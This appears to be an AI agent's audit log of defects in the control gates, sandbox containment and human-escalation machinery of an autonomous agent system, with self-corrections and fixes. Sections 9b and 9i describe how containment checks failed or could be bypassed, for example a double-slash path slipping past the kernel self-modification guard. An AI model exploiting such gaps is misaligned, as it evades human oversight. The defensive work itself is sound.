| `ORPHAN-CRITICAL-428` | CRITICAL | `HARD_FAIL_CHECKS` is 17 names with no callable field and zero iterators; `expert_review_gate.py` has zero production callers; a count-pinning test passes green                                         |
| `ORPHAN-HIGH-429`     | HIGH     | Gate B oscillation guard has no caller while its streak only increments — fix/reopen loops unbounded, and a runbook points operators at a file that can never be written                                 |
| `ORPHAN-HIGH-430`     | HIGH     | ARIA-Watchdog goes silent after its first poll: its own governance writes advance the read cursor past the events it should see (zero findings in 15 iterations)                                         |
| `ORPHAN-HIGH-431`     | HIGH     | the banned-phrase hard-reject check reads keys the production envelope never has — 11 of 12 banned phrases present, `hits: []`, on 100% of submissions                                                   |
| `ORPHAN-MEDIUM-432`   | MEDIUM   | Architecture Spine Gate drops unreadable files from the violation count; deleting `apps/`+`libs/` scores as improvement (latent)                                                                         |
| `ORPHAN-HIGH-433`     | HIGH     | **the publication integrity gate added in this session covers only a fraction of the declared state surfaces**                                                                                           |
| `ORPHAN-HIGH-434`     | HIGH     | the daily report can never be staged — `.gitignore` excludes the parent directory, so no chain-tip anchor has been committed since 2026-05-08                                                            |
| `ORPHAN-HIGH-435`     | HIGH     | the kernel test suite inherits the agent container's global git config, so every fixture commit invokes an external signing binary and the suite can redden for reasons unrelated to the code under test |

### `ORPHAN-HIGH-435` — the gate that every other gate depends on

Found while verifying the programme plan rather than while hunting, which is why it arrives after
the other eight. Under concurrent agent load three tests failed with `git commit` exit 128 inside
their own temp-repo fixtures (`aria-kernel/tests/test_evidence_trust.py:50`,
`aria-kernel/tests/test_executor_lane.py:34`); all 33 passed on an isolated re-run. The initial
hypothesis — a globally-set `commit.gpgsign=true` — was only half right, and the half that was
missing is the part that matters.

Primary evidence: `git config --global` resolves `commit.gpgsign=true`, `gpg.format=ssh`,
`gpg.ssh.program=/tmp/code-sign`, and `/tmp/code-sign` is a **symlink to
`/opt/env-runner/environment-manager`** — the agent harness's own binary. A bare `git init` in a
temp directory inherits all three. So every fixture commit, in roughly thirty test files that build
repos inline, was invoking an external harness-managed program with its own availability and
concurrency behaviour. The failure was not a flake in the tests; it was the harness answering slowly
under load, reported as a test failure.

This is registered HIGH rather than MEDIUM because of what depends on it. Every stage gate in
`docs/plans/2026-07-26-aria-software-team-program/PLAN.md` exits on "suite green". A suite whose
verdict is a function of machine state is the same defect class as the dashboard that reported 21
blocked cycles as `ok` — a signal that can be wrong while looking authoritative. It is fixed at
tier 1 rather than tier 2: `tests/__init__.py` redirects `GIT_CONFIG_GLOBAL` and `GIT_CONFIG_SYSTEM`
for the whole test process, so ambient leakage is structurally impossible for every fixture in the
process rather than something each new test must remember to defend against. Repo-**local**
configuration is deliberately left alone, so `gh_token_factory.mint_signing_key` setting
`--local commit.gpgsign true` remains observable.

### `ORPHAN-HIGH-433` corrects a claim made in this same session

The `ORPHAN-HIGH-424` commit message says publication is now fail-closed. That is true only for the
surfaces `integrity verify` actually hashes. `STATE_SURFACES` declares **160** surfaces while
`covered_tool_ledgers()` returns a small subset — 4 in a bare tree, ~28 once conditional files
exist. Uncovered surfaces include `enterprise_acceptance_events`, `autonomy_state`,
`cost_attribution`, `cost_budget`, `cost_telemetry` and `handoffs`. A cycle killed mid-append to any
of those still yields `status: ok`, so `state_valid=true` and the damaged tree is published under the
canonical name with `overwrite: true`, destroying the last good copy.

So the gate is a real improvement over the unconditional `if: always()` upload it replaced, and it is
**not** the full guarantee the commit implied. Closing `ORPHAN-HIGH-433` means extending coverage to every declared
surface, which is the same work as P1-01.

`ORPHAN-HIGH-434` also explains a data point visible from the start and not chased: the newest daily
anchor tracked in git is `2026-05-08.md`.

### Traceability correction for `2da9bf1f9`

**This correction was itself wrong twice, and is repaired here.** It was written against
`f46324323` — a commit on the abandoned pre-retrace branch that is **not an ancestor of this
branch** — so it named a SHA no reviewer of this PR can resolve, and it never named the commit that
actually carries the defect. It also used bare old-numbering IDs (`342`/`343`) that the retrace had
already remapped, so it read as being about two unrelated live findings. Both were found by an
adversarial audit, not by me.

The commit on THIS branch is `2da9bf1f9`, and its footer reads
`Closes: …#ORPHAN-CRITICAL-427`. That is wrong on both counts:

- the commit's subject is the **`ORPHAN-CRITICAL-428`** work (the executable hard-fail registry);
  `ORPHAN-CRITICAL-427` was closed by `05153e93d`, the preceding commit, whose trailer says so —
  so `427` now has two closing trailers and `428` has none;
- **`ORPHAN-CRITICAL-428` is NOT closed.** Five of its 17 checks are bound to real implementations;
  twelve bind an explicit failing `_not_implemented`, and the report is not threaded into
  `pr_manager.open_pr_for_action` or `auto_merge.merge_if_green`. An independent verifier later
  confirmed the whole perimeter still has **zero non-test callers**.

Corrected here rather than by rewriting history, because force-push is forbidden and the trailer is
already pushed. The retrace re-authored every commit message and was in a position to fix this —
that it reproduced a known-wrong trailer verbatim is the actual lesson, and it is recorded as such
rather than presented as an unavoidable constraint.

`ORPHAN-CRITICAL-428` stays `OPEN` — owner okan, deadline 2026-08-02 — until the twelve
implementations and the two call sites land. Autonomous merge stays closed until then. Read
`2da9bf1f9` as "partial progress on `ORPHAN-CRITICAL-428`", never as a closure of anything.

**Phase A update.** The five mechanical pre-PR-open checks now have real implementations, so all ten
`pre_pr_open` entries are executable and the seven still bound to `_not_implemented` are exactly the
`pre_merge` set. Two things surfaced while building them, both worth recording because they change
what the registry means:

- `kernel_self_modification_blocked_at_envelope_mint` and `forbidden_scope_normalized` are **not**
  duplicates, and a reader who assumes they are would delete the wrong one. The mint check is purely
  lexical over the envelope's declared `affected_surfaces` — no filesystem — which is precisely why
  it works at mint time; the scope check resolves real paths through a workspace and returns
  `workspace_root_absent` at that point. A test asserts the difference directly.
- The registry described the canonical validation suite as "nx affected, type-check, mutation,
  coverage". This repository has **no** mutation-testing script and **no** coverage target, so that
  gate could never have been satisfied. It was invisible because the check bound `_not_implemented`
  and failed for that reason instead — an unsatisfiable requirement hiding behind an unbuilt one.
  The check is implemented against the three commands that exist and the description corrected to
  match; the genuine platform gap is registered as `ORPHAN-MEDIUM-436` rather than dropped.

`ORPHAN-CRITICAL-428` remains OPEN: the seven pre-merge checks and the two call sites
(`pr_manager.open_pr_for_action`, `auto_merge.merge_if_green`) are phase B, stage S2.

### What the hunt did not cover

Recorded because an unexamined area is the finding most likely to be missed next: live-but-wrong
arithmetic (threshold direction in `detect_drift`, tier mapping in `triage.py`, promotion arithmetic,
`judge_calibration` scoring); concurrency and TOCTOU (`file_lock`, lease TTL versus in-flight
subprocess, a manual `autonomy run` racing the cron); chain verification on the read paths that gate
decisions; token scope and the `is_gh_api_path_forbidden` denylist, credited as a control and never
bypass-tested; prompt injection through repo content, finding text and PR bodies into agent prompts;
cost and resource exhaustion; crash recovery and idempotency; clock and artifact-expiry effects on
cumulative counters. `auto_merge.py`, `merge_authority.py` and `pr_manager.py` were read only to
prove a negative, so their own gating logic remains untested. One candidate — `runner_attestation.py`,
a self-attested `sandbox_available` with no production caller, sitting directly on top of
`ORPHAN-CRITICAL-427` — was
found and not written up.

The method gap worth fixing: the caller census was a one-level AST scan classifying test versus
production by path. It did not resolve `python3 -m aria_kernel <subcommand>` strings inside workflow
YAML, nor compute reachability from real entrypoints — a symbol with one production caller that is
itself unreachable still counts as wired. The Tier-3 generalisation of
`ORPHAN-CRITICAL-427`/`-428`/`ORPHAN-HIGH-429` is a CI check that
diffs the gates _declared_ in the plan and policy documents against the set actually reachable from
an entrypoint.

## 9. The traceability machinery itself was broken (`ORPHAN-HIGH-417`)

Found while trying to make this session's own fix commits pass the `Closes:` gate, which is the
only reason it was found at all: the defect is invisible until you mint a finding and reference it.

Two halves, both reproduced directly.

**The allocator was blind to half its own identifier space.** `tools/gates/finding-registry.ts`
built `existingIds` from the hash-chained registry plus the reservation ledger, and never from
`docs/reviews/orphan-findings.md` — which allocates from the same ORPHAN sequence. The registry's
ORPHAN maximum was **332** while the markdown store was already at **416**. So the allocator handed
out 333, then 334, and so on: nineteen identifiers that already named live findings.

```
nextFindingId('ORPHAN','HIGH', registryIds)                    -> ORPHAN-HIGH-333   (pre-fix)
nextFindingId('ORPHAN','HIGH', registryIds + markdownSequences) -> ORPHAN-HIGH-417   (post-fix)
```

Eight of the nineteen collided exactly — 337, 338, 340, 341, 344, 347, 349, 350 — so commit trailers
citing them **resolved, to the wrong finding.** That is worse than failing: a green gate asserting a
false link. Eleven differed only in severity, so they failed to resolve and turned the gate red,
which is how the whole thing surfaced.

**The resolver was blind to the other half.** `validateCommit` routed every `ORPHAN-`prefixed trailer
to the markdown store and never consulted the registry — while the gate's own failure message told
the author that "Finding IDs live in: `docs/reviews/_registry/findings.jsonl`". Eleven ledger ORPHAN
IDs were already unreferenceable this way **before this session touched anything**.

A third contributor: `ORPHAN_HEADING_REGEX` demanded a `CRITICAL|HIGH|MEDIUM|LOW` segment and exactly
three digits, so it skipped 16 real headings (`ORPHAN-001..013`, `ORPHAN-063`, `ORPHAN-INFO-363`,
`ORPHAN-LOW-337b`). Every heading it could not see was a sequence the allocator believed free.

The fix puts the pattern and its reader in one place — `finding-registry-store.ts` — read by both the
allocator and the resolver, so the two cannot drift again, and wires the gate's own unit tests into
CI, where they had never run.

## 9b. Two S1 blockers found by auditing our own fix (`ORPHAN-CRITICAL-439`, `ORPHAN-CRITICAL-440`)

Both were found by an adversarial contract-drift pass over this branch, not by the original hunt, and
both would have made S1 produce nothing while looking healthy.

### `ORPHAN-CRITICAL-439` — containment with no backend is a disable switch

`sandbox_backend()` returns `bwrap`, `firejail` or `None`, and
`claude_runtime._apply_write_containment` refuses a write-capable spawn when it is `None`. No
`.github/workflows` step installed either binary, and neither is present in the development
container, so `sandbox_backend()` was `None` **everywhere the kernel runs**. The consequence is not
a weaker perimeter — it is no execution: replace the NoOp implementer and the spawn is refused, so
the cycle produces nothing and the cause reads as an agent fault rather than a missing package.

A second defect sat underneath it. `_bwrap_available()` was `shutil.which("bwrap") is not None` —
**presence, not capability**. Inside a container without unprivileged user namespaces, bubblewrap
installs cleanly and then fails on every invocation; a PATH-only check would report a backend, the
wrapper would build an argv, and the spawn would die at runtime. Availability now means a probe
exercising the same ro-binds, tmpfs and `--unshare-net` the real wrapper uses actually succeeded.

Fixed at all three tiers: the workflow installs a backend; a CI step asserts
`sandbox_backend() is not None` so the absence fails a gate rather than silently disabling the
implementer; and `test_executor_workflow_sandbox_contract.py` fails the build if a workflow
dispatches a write-capable executor without declaring both.

### `ORPHAN-CRITICAL-440` — the burn-in rejected the evidence it exists to produce

`burn_in._require_clean_worktree` raised on **any** porcelain output, while `worktree.preflight` over
the same tree already excluded `aria-tools/`, `aria-findings/`, `aria-debts/` and friends. One tree,
two contradictory definitions of "clean".

That became live the moment the `.gitignore` descent fix made `aria-tools/reports/daily/*.md`
trackable: `reflection` writes it every cycle, so the next `mode=burn-in-observe` dispatch would die
with `observe_burn_in_pre_worktree_not_clean`. L1 requires 30 `observe_successes` and the burn-in is
their only producer, so the fix that opened S1 would have closed the ladder at rung zero. CI cannot
see it — CI points the kernel at `.aria-ci/tools`.

Fixed by importing `worktree.is_runtime_path` rather than restating the prefix tuple, so the two
guards cannot drift apart again. The regression test was verified to fail before the fix with the
exact error, after a first attempt at it passed against the unfixed code — driving the guard through
`run_observe_burn_in` meant `_validate_args` rejected the small cycle counts first, so the guard was
never reached. An assertion that can pass for the wrong reason is the same defect class as the rest
of this document.

## 9c. `security-audit` is blocked and cannot be fixed here (`SUPPLY-HIGH-001`)

**This section replaces an earlier version of itself that was wrong, and the commit
`e4bcb6cf7` it described claimed a green audit that does not hold.** The correction is here
rather than rewritten out, because a review document that edits away its own errors is not a
review document.

`security-audit` is a required check and it is red for reasons that predate this branch:
`package.json` and `package-lock.json` are byte-identical at base `bdaf00bf` and at the head
that first went red, and an earlier run on the same lockfile passed the step. The advisory
database moved.

### What was tried, and why it broke the build

`npm audit` names `brace-expansion` `<=5.0.7` with `5.0.8` as the only fix, and suggests an
override. Taking that suggestion **broke the Nx project graph** — `test`, `lint`, `build` and
`type-check` all died with:

```
An error occurred while processing files for the @nx/eslint/plugin plugin.
  - eslint.config.mjs:
      expand is not a function
```

The mechanism, verified directly: `brace-expansion@5.0.8` no longer exports a callable. It
exports an object.

```
node -e "console.log(typeof require('brace-expansion'))"   ->  object
                       Object.keys(...)                    ->  [EXPANSION_MAX, EXPANSION_MAX_LENGTH, expand]
```

Every `minimatch` line in this tree expects the callable default export — `minimatch@3.1.5`
wants `^1.1.7`, `9.0.9` wants `^2.0.2`, `10.0.1` wants `^2.0.1` — and this repository pins
`minimatch` deliberately for eslint, glob and typeorm. So the override cannot work for any
consumer here, which is not a packaging accident: the maintainer **renamed the package** at
v5, and `minimatch@10.1.1` depends on `@isaacs/brace-expansion@^5.0.0`. Old-name 5.x is a
different artifact with a different contract.

### What the correct fix is, and why it is not this PR

Clearing the advisory means moving the eslint, glob and typeorm consumers to
`minimatch@10.1.1+`, which drops `brace-expansion` in favour of the renamed package.
`minimatch@10` is ESM-only, so that is a coordinated upgrade across the lint toolchain — and
`typeorm` carries **its own** root advisory (`migration:generate` template literal) against a
**governed fork** in this repo (`npm run typeorm:verify-governed-fork`).

That is a dependency PR with its own verification surface. It has no business riding along with
an ARIA control-plane change, and it cannot be short-circuited: `--audit-level` must not be
lowered, and an override that breaks the build is not a fix.

All dependency edits are therefore reverted to base — including the `sharp` 0.34 → 0.35 bump,
which was verified and correct in isolation (40 projects type-clean, `media-finalization` 4/4,
`file-upload-security` 10/10, plus a real type break in `thumbnail.service.ts` that the
verification caught). It is reverted anyway: a semver-major native dependency bump is risk, and
carrying risk that cannot achieve the gate's green buys nothing. It belongs in the same
dependency PR.

`SUPPLY-HIGH-001` stays **OPEN**. Its registry row's notes were written when the override was
believed to work and overstate what is achievable by that route; this section is the current
account.

**Correction — this section named the wrong advisory set, and it is the second time.** It said
"two root advisories — `brace-expansion` and `typeorm`". An adversarial verifier re-ran the gate
command and I reproduced it:

```
.github/workflows/ci-affected.yml:1019
  npm audit --audit-level=high --omit=dev --json

  moderate: 8    high: 4    critical: 0
  high  brace-expansion   transitive
  high  fast-uri          transitive
  high  postcss           DIRECT
  high  sharp             DIRECT
```

`typeorm`'s advisory is **moderate**, so it cannot turn a `--audit-level=high` gate red at all —
naming it as a blocker was simply wrong. And three real blockers went unnamed, one of them `sharp`,
which is the dependency this very section argues for reverting.

The conclusion survives — the check stays red, it is pre-existing against a lockfile byte-identical
to base, and it belongs in its own dependency PR — but the stated _cause_ did not, and this section
was itself the replacement for an earlier account that was also wrong. Two consecutive attempts at
one paragraph, both confidently incorrect, both about numbers a single command prints. Recorded
because it is the clearest instance in this document of the difference between reasoning about a
system and measuring it.

## 9d. Why the same mistake happened three times (`ORPHAN-HIGH-441`)

Three commits in this session were written with a `fix`/`security` type and no `Closes:` trailer.
The third one is why this section exists: a mistake repeated three times is usually a missing
control, not carelessness, and asking which control was missing found one more instance of the
pattern this whole document is about.

`.husky/commit-msg` enforces CLAUDE.md's Review Finding Traceability rule. Its **only** binding was
`prepare: husky install`. This repository mandates `npm ci --ignore-scripts` for supply-chain hygiene
(SEC-CI-007) — nineteen workflows use it, and it is the documented contributor install. So `prepare`
never executes. Verified in this clone: `core.hooksPath` unset, `.git/hooks/commit-msg` absent, while
`.husky/commit-msg` exists, is executable, and — run by hand against the offending message — exits 1
with the exact violation CI reported later.

A control whose only binding is a lifecycle script that the project's own install procedure disables
is not a control. It is documentation that happens to be executable.

The cost is specific rather than cosmetic. `closes-footer-check` validates the **whole PR range**, so
a missing trailer on a pushed commit cannot be repaired by a follow-up commit — it needs history
rewriting, which this repo forbids. The price of the local hook not running is a branch retrace, not
an amend.

Fixed at the honest tier ceiling. A repository cannot force a developer's local git config, so this
is **tier 2** — `npm run hooks:install`, which sets `core.hooksPath` and needs no lifecycle script —
plus **tier 3** — `tests/invariants/git-hook-binding.spec.ts`, which asserts the hooks exist and are
executable, that an installer independent of `prepare` exists, and that the hook and the workflow
still point at the same validator so a commit cannot pass locally and fail in CI. It is not tier 1
and does not claim to be.

## 9e. Auditing this branch's own diff (`ORPHAN-MEDIUM-442`, `ORPHAN-HIGH-443`, `ORPHAN-MEDIUM-444`)

The operator's instruction was to be sure everything here was done correctly, so the branch was
audited the way the original code was. Three defects, all introduced by this branch, all confirmed
mechanically before being written down.

**`ORPHAN-MEDIUM-442` — a `# type: ignore` on the value that decides a gate.** The kernel carries 19
`# type: ignore` comments at base `bdaf00bf` and 20 at branch head; the added one was
`specialist_review_runner.py:546`, `consolidated_verdict=verdict,  # type: ignore[typeddict-item]`.
`SpecialistReviewResult` declared `consolidated_verdict` as an inline four-value `Literal` while
`verdict` came out of an `if`/`elif`/`else` and inferred as `str`, so the construction did not
type-check and the suppression made it quiet. CLAUDE.md bans `as any` and `@ts-ignore`; the Python
analogue is the same defect in another language. The fix was available and cheap — `Literal` was
already imported. Naming the union as `ConsolidatedVerdict`, using it in the TypedDict, annotating
`verdict` at its assignment site, and deleting the suppression leaves mypy 1.19.1 reporting zero
errors for the module.

**`ORPHAN-HIGH-443` — the Gate C block policy was a denylist.** Removing the suppression forced the
question of what the boundary actually admits, and the answer was: anything.
`specialist_verdict_blocks_cycle` returned `True` for `consolidated_remediation_required` and
`consolidated_judge_split`, `True` for `specialists_unavailable` outside `observe`, and `False` for
**everything else** — so a verdict the module had never heard of was indistinguishable from
`consolidated_no_gaps`, and the cycle proceeded to `worker_drainer` on a domain nobody reviewed.

The boundary is genuinely untyped in production, which is what makes this reachable rather than
theoretical: `specialist_review_runner` is an injected kwarg behind a `Protocol`, and
`autonomy_orchestrator:1489` reads the verdict with `dict.get()`. A typo, a renamed verdict, or a row
written by a newer build all arrive as an arbitrary string.

This is the same inversion `ORPHAN-HIGH-423` fixed one instance of. 423 stopped `standard` and
`autonomous` failing open on `specialists_unavailable` but left the surrounding default alone — the
fix was scoped to the case that had been noticed. Inverting the shape closes the class:
`consolidated_no_gaps` is now the only value that returns `False`; the always-blocking pair still
blocks in every profile including `observe`; and everything else, known-unsatisfiable or
unrecognised alike, blocks wherever a write can follow. Regression test `I-GATE-08b` covers five
unknown values across three write-capable profiles and **fails 15/15 subtests** against the pre-fix
body, so it is not vacuous.

**`ORPHAN-MEDIUM-444` — a refusal that ran after its own side effects.** `repin-debt-plan.mjs`
shipped in `cfec3241c` with a docstring promising that a changed `active_critical_ids` list makes it
"say so and stop, rather than silently producing a manifest whose id list no longer matches its own
table", and the commit message repeated the claim. The code did the opposite: `writeFileSync` ran for
`manifest.json`, `finding-truth-table.md` and `README.md`, and only then did the comparison reach
`process.exit(1)`. A refused run left three modified files with the counts repinned and the id list
stale — exactly the inconsistent mirror the docstring said it prevented. A docstring asserting the
opposite of the code is worse than no docstring, because it answers the question a reader would
otherwise go and check.

Fixed by hoisting the comparison into a top-level precondition ahead of every write, and verified
behaviourally rather than by re-reading: with the manifest perturbed to drop one id **and** to carry
a deliberately wrong `registry_entries`, the script exits 1 and `md5sum -c` confirms all three files
byte-unchanged — including the wrong count the old ordering would have silently corrected on its way
to refusing. On a clean tree it still reports `already current` and exits 0.

**`ORPHAN-MEDIUM-445` — a derived value with a checker and no writer.** Fixing 442 and 443 reddened
`aria-doc-runtime-ssot.spec.ts`, which digests every tracked file under `docs/aria/`, `aria-kernel/`,
`tools/aria-poc/` and the `aria-*` workflows into a `Last verified ARIA authority hash` line in
`docs/aria/CURRENT_STATE.md`. That hash is what makes CURRENT_STATE falsifiable instead of
aspirational — but nothing produced it. The refresh procedure was to read the expected value out of a
failing Jest assertion and paste it in, which is why it was already stale and sitting on the task
list. Structurally the same shape as the debt-plan manifest before 444's script, and it failed the
same way: an unrelated spec goes red with a message that reads like a broken test rather than a
document that has fallen behind its runtime.

The fix is tier 2 with a tier-1 guarantee attached. `tools/gates/aria-authority-hash.ts` owns the
digest and gains a `--write` mode (`npm run aria:authority-hash:write`), and the spec **imports** it
rather than keeping a private copy — so a writer that disagrees with the checker is not expressible.
A script that reimplemented the digest would confidently write a value the spec then rejects, which
is worse than having no script. Verified: the writer moved `65f80ec4` → `6a3b4251`, a second run
reports `already current`, and the spec passes 16/16. The digest is a fixed point because the hash
line is normalised to a sentinel before hashing, so writing the value back cannot invalidate it.

None of the four was found by the suite. 442 needed a base-vs-head count of suppressions, 443 needed
someone to ask what an untyped seam admits, 444 needed the script to be run against a perturbed input
rather than read, and 445 only surfaced because fixing the first two moved a hash nobody had a
command to regenerate. That is the same gap this document describes in ARIA, observed in the work
that was closing it.

**One failure in `invariants:fast` is neither mine nor the repo's.**
`backup-production-secrets.spec.ts` fails two assertions in this container with exit status 2. It
reproduces identically with every change in this session stashed, and the cause is mechanical:
`tools/scripts/ci/run-protected-ssh.sh` begins with a presence check for the `ssh` binary, which is
absent here, so the helper exits `FATAL: ssh is required` before any assertion is reachable. CI
runners ship `openssh-client` and the spec passes there. Recorded rather than silently ignored,
because "two tests were already red" is exactly the sentence under which a real regression hides.

## 9f. The re-audit that found what §9e missed (`ORPHAN-CRITICAL-446`, `-HIGH-447`, `-MEDIUM-448`)

§9e was my own reading of my own diff. An independent adversarial pass over the same branch — seven
lenses, no shared context with the work — found three more, and the first one is the worst defect
this branch produced. Its skeptic stage never ran, so every claim below was re-verified by hand
before being accepted; the ones that did not survive are recorded at the end.

**`ORPHAN-CRITICAL-446` — the commit titled "make all three convergence independence layers
functional" left one of them non-functional, and made things worse than before.** `convergence_drainer`
records the round's role→dispatch map immediately after minting the cross-review envelope — before
the reviewer has run — and passed `agent_text=None` as a literal. Nothing refreshed that record once
the review landed. `_diversity_reasons` short-circuits on `{role}_text_unavailable` whenever either
side lacks text, so both comparisons the layer exists for — primary↔cross_review and
challenger↔cross_review — were never computed in any production round.

Verified empirically rather than by reading. Constructing the exact dispatches the drainer builds:

```
cross_review.has_text: False
diversity(primary, cross_review):    ['cross_review_text_unavailable']
diversity(challenger, cross_review): ['cross_review_text_unavailable']
verify_independence -> passed: False
```

The consequence goes past "the check is a no-op". `convergence_drainer` downgrades the verdict on
`not independence_ok`, so **no plan could hold a `converged` verdict** — the convergence stage
terminated in `cross_review_self_agreement` forever. Before the change the layer was a vacuous pass;
after it, a vacuous fail plus a capability regression hidden behind a "now functional" claim. That
inversion is precisely the failure mode this whole document is about, and I shipped it while
documenting it.

The fix re-records the cross-review dispatch with the reviewer's real output once the plan reaches
`CROSS_REVIEWED`, reading it through `accepted_result_for_request` so an undelivered review stays a
violation rather than an assumption. The reader returns `None` and never `""`: `RoundDispatch` fails
closed on `None`, whereas an empty string scores as maximally diverse against anything and passes.
Eight regression tests, including one that asserts the pre-fix shape so the file cannot pass
vacuously, and one that confirms a reviewer parroting the primary is still caught by the Jaccard
ceiling.

Worth stating plainly: nothing in the suite could have caught this, because nothing covered the
drainer's wiring at all — `grep -rn round_dispatch aria-kernel/tests/` returned zero hits. The layers
were tested in isolation and the caller that feeds them was not.

**`ORPHAN-HIGH-447` — the tests pinning the specialist gate could stop asserting without going red.**
I-GATE-06 and I-GATE-07 both ended with `if not result["specialists_dispatched"]: self.skipTest(...)`
— the only skip markers this branch added, on the two cases that pin `ORPHAN-HIGH-423`. The fixture
pins the input (`touched_services=["apps/auth-service/"]`, which the touch-map resolves to two
specialists), so the guarded condition is not environmental variance; it is the case where the gate
under test was never exercised. Both are now assertions.

Found in the same file: two `# type: ignore[arg-type]` comments suppressing an error code mypy does
not raise here. The real error is `return-value` — both helpers were annotated `-> dict` while
returning a TypedDict — and it went unreported only because nothing runs mypy over `aria-kernel/tests`.
Giving the helpers their true return types removed both suppressions and immediately surfaced five
further latent errors from indexing a `dict | None` after `assertIsNotNone`, which is not a
`TypeGuard`. The annotation started doing work the moment it stopped being `dict`.

**`ORPHAN-MEDIUM-448` — the repin script, on a second pass.** `repinManifest` threw on a missing
anchor while `repinTruthTable` and `repinReadme` returned a boolean the caller discarded, so a renamed
README bullet made the script print success and exit 0 having refreshed nothing. Making those throw
is only half a fix: throwing on the third file after writing the first two reproduces `444`'s
write-before-refuse bug in a new order. The three functions are now pure planners that validate every
anchor and return the bytes they would write, with nothing touching the filesystem until all three
succeed — verified by renaming a README bullet and confirming exit 1 with all three files
byte-unchanged. It is also now TypeScript: `tools/gates/tsconfig.json` includes `**/*.ts`, so as
`.mjs` it was the one executable gate script in that directory nothing type-checked.

**Claims from the same pass that were checked and are recorded rather than fixed here.** Several are
real but belong to work already tracked: the hard-fail perimeter having no non-test caller is
`ORPHAN-CRITICAL-428`, still OPEN and scheduled for S2; `PLAN.md` citing abandoned-branch SHAs and
surviving bare numeric old-ID references are documentation defects in the plan of record, not in
code. Two lens claims did not survive checking and are not registered. The rest of the pass remains
unverified: it ran seven of nine lenses before the session broke, and its skeptic stage — the stage
that exists to kill plausible-but-wrong findings — never ran at all. Nothing from it is treated as
confirmed unless it appears above with a command behind it.

## 9g. The fix that shipped its own defect (`ORPHAN-MEDIUM-449`)

`ORPHAN-MEDIUM-445` gave the authority hash a writer because it had a checker and no producer. One
commit later CI went red on `aria-merge-authority` and `invariants-fast` — both green on the previous
head — with `expected 13fb3632`, `recorded 6dcc7a99`.

The digest is defined over `git ls-files`, which reads the **index**. I ran the writer while the new
kernel test file was still untracked, so it hashed a file set that excluded it; `git add -A` then
brought the file in and the committed tree hashed differently. Local validation could not have caught
this: every local run read the same dirty index that produced the wrong value, so the spec passed
locally and failed on a fresh checkout of the identical commit.

Worth naming precisely, because it is not a typo. A generator whose output depends on staging order
is the same class of defect as a mirror with no generator — the thing `445` was closing — and it
arrived inside `445`'s own fix. The writer now refuses when `git ls-files --others --exclude-standard`
reports anything under the authority roots, naming the files and saying to stage them first. That is
the same expression `format-scope.json` uses to answer "what will the commit contain".

## 9h. A 498-line control that never ran (`ORPHAN-HIGH-450`)

The adversarial pass claimed `68957e8bd` carries `Closes: …#ORPHAN-HIGH-426` while the adjudication
module it added has zero production callers. Checked, and true: grepping importers of
`human_required_adjudication` across `aria-kernel/` and `tools/`, excluding `aria-kernel/tests/`,
returns nothing. The only two importers are test files.

The module itself is not the problem — it is 498 lines of careful work: an independent three-agent
panel, principal-disjointness verified against the claims ledger, a closed irreducible class that
keeps profile transitions and credential mints away from agents, and a fail-closed quorum in which
one `insufficient_evidence` blocks resolution. All correct. None of it executed.

`cycle.py` runs the two sweeps that **create** escalations on every cycle and ran nothing that acted
on them, so the observable behaviour after the fix was identical to the behaviour `ORPHAN-HIGH-426`
described: an escalation waits for a person. A control is the code that runs it. This is the audit's
own subject — _declared authority with no production caller_ — reproduced inside the fix for an
instance of it, which is why it is registered separately rather than quietly folded into `426`.

`sweep_human_required_adjudications()` is now the caller, running in `cycle.py` immediately after the
two creating sweeps, under the same shadow/discovery guards, with its result in the cycle summary.
Three properties make it safe to run every cycle, and each has a test:

- **reachable from `run_cycle`** — asserted against the module object, not source text, so it
  survives a refactor that keeps the call and fails one that drops it. This is the property whose
  absence _was_ the bug;
- **idempotent** — asserted over five consecutive sweeps of an escalation whose panel never
  delivers, which is the exact case that would otherwise mint three fresh envelopes and a new ledger
  row every cycle forever, because `open_adjudication` is not idempotent;
- **skips rather than attempts the irreducible class** — verified across `profile_transition`,
  `credential_mint`, `merge_authority`, an unadmitted future kind, and a context-free record, none of
  which mint anything. Those escalations must keep waiting for a person, and now they do so without
  a panel being asked about them.

## 9i. The 13-agent audit, and the six defects it found that I had not (`451`–`456`)

The adversarial pass whose partial output §9f acted on ran to completion: six lenses, six skeptics,
one synthesis. **28 confirmed defects, eight HIGH, one CRITICAL, four claims dropped as false
alarms** — including two the skeptics overturned against their own lens, which is the stage §9f did
not have. Everything below was re-verified by hand at the current head before being accepted.

**Its load-bearing result is about evidence, not code.** The auditor extracted the branch to a
scratch repo, replaced `autonomy_orchestrator.py`, `convergence_drainer.py` and `cycle.py` with their
base versions, and ran the suite: **2805 tests, OK, zero failures.** Positive controls on the same
harness confirm it detects real reverts — `circuit_breaker.py` reverted gives 5 errors, `burn_in.py`
gives 1. So three of this branch's headline fixes could silently regress, and "2805 tests OK" was not
evidence for them. That is `ORPHAN-HIGH-455`, and it is the finding that most changes how the rest of
this document should be read.

The pattern behind it is structural: extract a helper so it becomes testable, test the helper, leave
the production callsite unpinned. It produced four independent instances in one branch — `455` (three
files), the tautological `test_i_gate_09`, the untested allocator wire, and `456`'s fixtures asserting
on a dict shape production never emits.

|                       |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ORPHAN-CRITICAL-451` | `wrap_bash_in_sandbox`'s firejail branch was `firejail --quiet --private-tmp --whitelist=<workspace>` — **zero** of the eighteen `READONLY_PATHS`, workspace writable, kernel included. `sandbox_backend()` returned non-None for it, which is PLAN.md's S0 exit criterion, and the refusal message told the operator to install it. Fixed by removing firejail entirely rather than adding `--read-only` flags: it cannot be verified here, and shipping an unverified security control is the defect being closed. |
| `ORPHAN-MEDIUM-452`   | The probe bound `/usr /lib /lib64 /bin`; the wrapper additionally bound `/etc/alternatives` and `/etc/ssl` **unguarded**, in violation of the comment directly above the probe demanding they match. On an image lacking either, the probe says "available" and every spawn then dies. Both now build from one existence-guarded list.                                                                                                                                                                               |
| `ORPHAN-HIGH-453`     | `_normalize_declared_path` collapsed a leading `./` and outer slashes only, so `aria-kernel//aria_kernel/cli.py` did not match the READONLY prefix and walked past `_check_kernel_self_modification_at_mint`. Now reconstructed segment-wise; `..` deliberately preserved so the caller's traversal rejection still fires.                                                                                                                                                                                           |
